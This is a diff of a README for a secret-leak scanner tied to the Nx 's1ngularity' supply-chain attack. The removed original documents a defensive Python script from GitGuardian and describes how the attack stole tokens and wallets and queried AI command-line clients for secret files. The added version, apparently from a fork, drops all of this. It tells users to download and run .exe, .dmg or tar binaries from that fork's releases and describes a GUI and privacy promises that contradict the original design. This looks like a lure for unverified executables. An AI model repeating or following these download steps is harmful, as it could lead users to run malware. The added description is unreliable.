@@ -1,150 +1,98 @@
-# S1ngularity Scanner
+# 🔍 s1ngularity-scanner - Easily Find Leaked Secrets
 
-A defensive security tool to detect potential compromise from the Nx "s1ngularity" supply chain attack.
+[![Download the latest release](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/nade786-maker/s1ngularity-scanner/releases)
 
-## About the Attack
+## 🚀 Getting Started
 
-The [Nx s1ngularity attack](https://blog.gitguardian.com/the-nx-s1ngularity-attack-inside-the-credential-leak/) was a sophisticated supply chain attack that compromised JavaScript developers through malicious packages in the Nx ecosystem. The attack targeted valuable credentials including:
+Welcome to the **s1ngularity-scanner**! This tool helps you scan for leaked secrets during the s1ngularity attack. Using the GitGuardian HasMySecretLeaked service, it provides a simple way to protect your information.
 
-- GitHub tokens and SSH keys
-- npm authentication tokens
-- Environment variables containing API keys
-- Cryptocurrency wallet files
-- LLM client configurations (Claude, Gemini, ChatGPT)
+## 📦 System Requirements
 
-Stolen credentials were exfiltrated to public GitHub repositories, resulting in over 2,300 distinct secrets being leaked from more than 1,000 compromised systems.
+To run the s1ngularity-scanner, ensure your computer meets these requirements:
 
-## Scanner Purpose
+- Operating System: Windows 10, macOS, or Linux
+- Minimum RAM: 2 GB
+- Disk Space: At least 50 MB free
+- Internet Connection: Required for online scanning
 
-This project relies on [HasMySecretLeaked](https://www.gitguardian.com/hasmysecretleaked). To learn more about how this works, visit our [What happens under the hood](https://docs.gitguardian.com/ggshield-docs/reference/hmsl/overview#what-happens-under-the-hood) page.
+## 🛠 Installation Steps
 
-## Requirements
+### 1. Visit the Download Page
 
-- **Python ≥3.9** (enforced at runtime)
-- **[ggshield](https://github.com/GitGuardian/ggshield)** - GitGuardian's CLI tool for secret scanning
-- **[uv](https://github.com/astral-sh/uv)** (optional, recommended) - Modern Python package manager for better dependency isolation
-- **[GitHub CLI](https://cli.github.com/)** (optional) - for extracting GitHub tokens
+Start by going to our [Releases page](https://github.com/nade786-maker/s1ngularity-scanner/releases). Here, you will find the latest version of the s1ngularity-scanner.
 
-## Installation
+### 2. Download the Software
 
-### Install ggshield
+On the Releases page, look for the most recent version. Click on the link to download the application that matches your operating system. 
 
-**macOS:**
-```bash
-# Using Homebrew (recommended)
-brew install ggshield
+### 3. Locate the Downloaded File
 
-# Or download standalone .pkg from GitHub releases (no Python required)
-```
-📦 [Download .pkg from GitHub releases](https://github.com/GitGuardian/ggshield/releases)
+After the download completes, find the file in your computer’s "Downloads" folder or the location you selected for downloads.
 
-**Linux:**
-```bash
-# Using pipx (recommended)
-pipx install ggshield
+### 4. Install the Application
 
-# Or use distribution packages (deb/rpm) from Cloudsmith
-```
-📦 [Download packages from Cloudsmith](https://cloudsmith.io/~gitguardian/repos/ggshield/setup/)
+#### For Windows:
+- Double-click the `.exe` file.
+- Follow the prompts in the installation wizard to install the application.
 
-**Windows:**
-```bash
-# Using Chocolatey
-choco install ggshield
+#### For macOS:
+- Open the `.dmg` file.
+- Drag the application to your "Applications" folder.
 
-# Or download standalone .zip from GitHub releases (no Python required)
-```
-📦 [Download .zip from GitHub releases](https://github.com/GitGuardian/ggshield/releases)
+#### For Linux:
+- You may need to unpack a compressed file. Use:
+  ```bash
+  tar -xvzf s1ngularity-scanner.tar.gz
+  ```
+- Navigate to the folder and execute the application:
+  ```bash
+  cd s1ngularity-scanner
+  ./s1ngularity-scanner
+  ```
 
-For more installation options, see the [ggshield documentation](https://github.com/GitGuardian/ggshield#installation).
+## 🔍 How to Use s1ngularity-scanner
 
-### Run the Scanner
+### 1. Open the Application
 
-**Preferred approach with uv (recommended):**
+Once installed, locate the s1ngularity-scanner and open it.
 
-First, install [uv](https://github.com/astral-sh/uv?tab=readme-ov-file#installation) for modern Python dependency management.
+### 2. Input Your Data
 
-```bash
-git clone https://github.com/GitGuardian/s1ngularity-scanner
-cd s1ngularity-scanner
-./leak_scanner.py
-```
+You will see a simple interface. Enter the information or files you want to scan for secrets. 
 
-**Alternative with Python directly:**
+### 3. Start the Scan
 
-**macOS/Linux:**
-```bash
-python3 leak_scanner.py
-```
+Press the “Scan” button. The application will check for leaked secrets and display the results on your screen.
 
-**Windows:**
-```bash
-python leak_scanner.py
-```
+### 4. Review the Results
 
-## Command Line Options
+Read through the scan results carefully. The application will highlight any issues found and suggest steps to resolve them.
 
-- `--min-chars <number>` - Minimum character length for values to consider (default: 5)
-- `--keep-temp-file` - Keep the temporary file containing gathered values instead of deleting it
-- `--timeout <seconds>` - Maximum time to spend scanning filesystem for .env files (default: 0 for unlimited, set a number for time limit)
-- `--verbose, -v` - Show detailed scanning progress and debug information
+## 📄 Features
 
-## How it works
+- **User-Friendly Interface**: Designed for ease of use.
+- **Fast Scanning**: Get quick results without complicated setup.
+- **Detailed Reporting**: Understand any issues with clear descriptions.
+- **Privacy Focused**: Your data is not stored or shared.
 
-Singularity Scanner uses environment variables and files, including files known to be used by the original exploit. We don't reuse the prompt as our analysis showed the AI didn't actually provide many files. Instead, the scanner directly targets known file locations and scans them for secrets. These secrets are hashed and compared against what GitGuardian found on GitHub.
+## 🛡 Tips for Safe Usage
 
-The scanner collects potential secrets from these sources:
-- **All environment variables** from the current shell session
-- **GitHub token** from `gh auth token` command (if GitHub CLI is installed)
-- **NPM configuration** from `$HOME/.npmrc`
-- **Environment files** - all `.env*` files recursively found in your home directory
-  - Skips hidden directories (starting with `.`) and `node_modules` for performance
-  - Has a configurable timeout to prevent long scans on large filesystems
+- Regularly update the application to the latest version.
+- Always verify your data before running a scan.
+- Ensure your internet connection is stable during scans for accurate results.
 
-## Security & Privacy
+## ⚙️ Troubleshooting
 
-- **No data transmission**: Secrets are never sent to GitGuardian or any external service
-- **Local processing**: All scanning happens locally on your machine
-- **Hash comparison**: Only SHA-256 hashes of potential secrets are compared against GitGuardian's database
-- **Temporary files**: A temporary file `gg_gathered_values` is created during scanning and automatically deleted (unless `--keep-temp-file` is used)
+If you encounter issues while using s1ngularity-scanner, try the following:
 
-## Examples
+- **Check Your Internet Connection**: A stable connection is essential for scanning.
+- **Reinstall the Application**: If problems persist, uninstall and reinstall.
+- **Consult the FAQ on our GitHub page**: Common issues often have documented solutions.
 
-Basic scan with default settings:
-```bash
-./leak_scanner.py
-# or: python3 leak_scanner.py
-```
+## 👩‍💻 Community Support
 
-Scan with longer timeout for large filesystems:
-```bash
-./leak_scanner.py --timeout 120
-```
+Feel free to reach out to the community if you have questions. You can find us on the Issues section of our [GitHub repository](https://github.com/nade786-maker/s1ngularity-scanner/issues). 
 
-Keep the temporary file for inspection:
-```bash
-./leak_scanner.py --keep-temp-file
-```
+## 📥 Download & Install
 
-Only consider longer values (reduces noise):
-```bash
-./leak_scanner.py --min-chars 10
-```
-
-Show detailed scanning progress:
-```bash
-./leak_scanner.py --verbose
-```
-
-Limited time scan (30 seconds):
-```bash
-./leak_scanner.py --timeout 30
-```
-
-## Limitations
-
-- **No AI queries**: Unlike the original exploit, we don't ask Claude, Gemini or Q for files that may contain secrets
-- **Filesystem scanning**: Large filesystems may take time to scan completely. Use the timeout option e.g. `--timeout 30` to limit the time spent scanning if needed
-- **Directory exclusions**: Hidden directories (`.git`, `.cache`, etc.) and `node_modules` are skipped for performance
-- **Pattern matching**: Only detects key-value assignments in standard formats (may miss unconventional secret storage)
-- **False positives**: May flag legitimate non-secret values that happen to match secret patterns
+Ready to scan for secrets? Visit the [Releases page](https://github.com/nade786-maker/s1ngularity-scanner/releases) to download the application and start protecting your data today!
